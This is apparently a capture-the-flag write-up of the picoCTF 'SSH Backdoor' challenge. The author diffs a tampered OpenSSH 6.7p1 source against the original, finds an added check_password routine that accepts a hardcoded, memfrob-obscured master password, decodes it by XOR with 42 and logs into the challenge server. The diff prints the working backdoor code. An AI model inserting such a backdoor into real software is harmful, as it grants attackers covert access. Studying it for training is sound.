__SSH Backdoor__
===========

_John Hammond_ | _Saturday, December 2nd, 2016_ 

 
> Some hackers have broken into my server backdoor.picoctf.com and locked my user out (my username is jon). I need to retrieve the flag.txt file from my home directory.
The last thing we noticed in out network logs show is the attacker downloading this. Can you figure out a way to get back into my account? 


----------

Oh hey, an [SSH] challenge! Hopefully this will be fun.

They give us a file to download, which is this: [`openssh-6.7p1-evil.tar`](openssh-6.7p1-evil.tar).

Just noting from the filename, it must be the source code package for [OpenSSH], [version 6.7](http://www.linuxfromscratch.org/blfs/view/7.7/postlfs/openssh.html)... but probably tampered with, since it notes "evil". 

Well, that ought to get us thinking, right? If it's a legitimate source code package, just changed a bit, can we get the original package and see what is changed, what are the differences?

I was able to find a download for the original package here: [http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz][http://ftp.openbsd.org/pub/OpenBSD/OpenSSH/portable/openssh-6.7p1.tar.gz]

We can extract them both, now. I separated them into different folders, because initially they overwrite each other...

```
tar xfv openssh-6.7p1.tar
mv openssh-6.7p1 good
tar xfv openssh-6.7p1-evil.tar
mv openssh-6.7p1 evil
```

Now we can take advantage of the [`diff`][diff] tool, which is _awesome_. We can give it the `-r` option to have it _recursively_ look for differences between two directories. So here we go:

```
diff -r good evil
```

We get some results:

``` c
diff -r good/auth.c evil/auth.c
776a777,794
> 
> static int frobcmp(const char *chk, const char *str) {
>   int rc = 0;
>   size_t len = strlen(str);
>   char *s = xstrdup(str);
>   memfrob(s, len);
> 
>   if (strcmp(chk, s) == 0) {
>       rc = 1;
>   }
> 
>   free(s);
>   return rc;
> }
> 
> int check_password(const char *password) {
>   return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
> }
diff -r good/auth.h evil/auth.h
213a214,215
> int check_password(const char *);
> 
diff -r good/auth-passwd.c evil/auth-passwd.c
114a115,117
>   if (check_password(password)) {
>       return ok;
>   }
Only in good: openssh-6.7p1
```

__Aha!__ Looks like they changed up the way they authenticate with a password. 

The bottom note says it is only in the "good" package, so the top one must be what is in the evil package, the one that we are really concerned with!

My knee-jerk reaction wa that string, it looks like it is comparing to the `password` variable. The challenge prompt said the username was `jon`, so I quickly tried to throw that string `"CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY"` at the login, but it didn't work...

```
ssh jon@backdoor.picoctf.com
jon@backdoor.picoctf.com's password: 
Permission denied, please try again.
```

Dammit, no luck. We can more thoroughly read what they are doing, though, since we can see that change in the source code.

``` c 
static int frobcmp(const char *chk, const char *str) {
    int rc = 0;
    size_t len = strlen(str);
    char *s = xstrdup(str);
    memfrob(s, len);

    if (strcmp(chk, s) == 0) {
        rc = 1;
    }

    free(s);
    return rc;
}
int check_password(const char *password) {
    return frobcmp("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", password);
}

```


So there are two functions here. The bottom one, `check_password`, must be the one that is really called when a user tries to authenticate. It looks like it is a wrapper for the `frobcmp` function, which is defined at the top.

I see a couple functions in there which I hadn't seen before, so I did some research on a few like the [`xstrdup`][xstrdup] one and the [`memfrob`][memfrob].

Check out the documentation page for the [`memfrob`][memfrob] function.

> The memfrob() function encrypts the first n bytes of the memory area s by exclusive-ORing each character with the number 42.

... ___What?___ ___Seriously?___ 

This is a real function? 

Well, okay, whatever, we'll work with it. In our case, it is being passed the first argument... which is currently our string `CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY`!

So, we have to [XOR] this with the number 42. Okay, that's easy enough.

I do this with the [pwntools] library in [Python], because it can [XOR] any set of data types really easily.

``` python
>>> from pwn import *
>>> xor("CGCDSE_XGKIBCDOY^OKFCDMSE_XLFKMY", 42)
'iminyourmachinestealingyourflags'
```

__Oh are you freaking kidding me__.

This _has_ to be the password. The string `iminyourmachinestealingyourflags` must be the login password for the `jon` user noted in the challenge description.

```
ssh jon@backdoor.picoctf.com
jon@backdoor.picoctf.com's password:
jon@ip-10-235-140-81:~$
```

Yup, got it.

```
ls
cat flag.txt
```

__Submit: `ssshhhhh_theres_a_backdoor`__

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier
[brute force]: https://en.wikipedia.org/wiki/Brute-force_attack
[for loop]: https://en.wikipedia.org/wiki/For_loop
[bash programming]: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
[Behemoth]: http://overthewire.org/wargames/behemoth/
[command line]: https://en.wikipedia.org/wiki/Command-line_interface
[command-line]: https://en.wikipedia.org/wiki/Command-line_interface
[cli]: https://en.wikipedia.org/wiki/Command-line_interface
[PHP]: https://php.net/
[URL]: https://en.wikipedia.org/wiki/Uniform_Resource_Locator
[TamperData]: https://addons.mozilla.org/en-US/firefox/addon/tamper-data/
[Firefox]: https://www.mozilla.org/en-US/firefox/new/?product=firefox-3.6.8&os=osx%E2%8C%A9=en-US
[Caesar Cipher]: https://en.wikipedia.org/wiki/Caesar_cipher
[Google Reverse Image Search]: https://www.google.com/imghp
[PicoCTF]: https://picoctf.com/
[JavaScript]: https://www.javascript.com/
[base64]: https://en.wikipedia.org/wiki/Base64
[client-side]: https://en.wikipedia.org/wiki/Client-side_scripting
[client side]: https://en.wikipedia.org/wiki/Client-side_scripting
[javascript:alert]: http://www.w3schools.com/js/js_popup.asp
[Java]: https://www.java.com/en/
[2147483647]: https://en.wikipedia.org/wiki/2147483647_%28number%29
[XOR]: https://en.wikipedia.org/wiki/Exclusive_or
[XOR cipher]: https://en.wikipedia.org/wiki/XOR_cipher
[RSA]: https://en.wikipedia.org/wiki/RSA_(cryptosystem)
[Cryptography]: https://en.wikipedia.org/wiki/Cryptography
[private key]: https://en.wikipedia.org/wiki/Public-key_cryptography
[public key]: https://en.wikipedia.org/wiki/Public-key_cryptography
[reverse engineering]: https://en.wikipedia.org/wiki/Reverse_engineering
[Towers of Hanoi]: https://en.wikipedia.org/wiki/Tower_of_Hanoi
[SSH]: https://en.wikipedia.org/wiki/Secure_Shell
[OpenSSH]: https://www.openssh.com/
[diff]: https://linux.die.net/man/1/diff
[xstrdup]: https://manned.org/xstrdup
[memfrob]: https://linux.die.net/man/3/memfrob
[pwntools]: https://github.com/Gallopsled/pwntools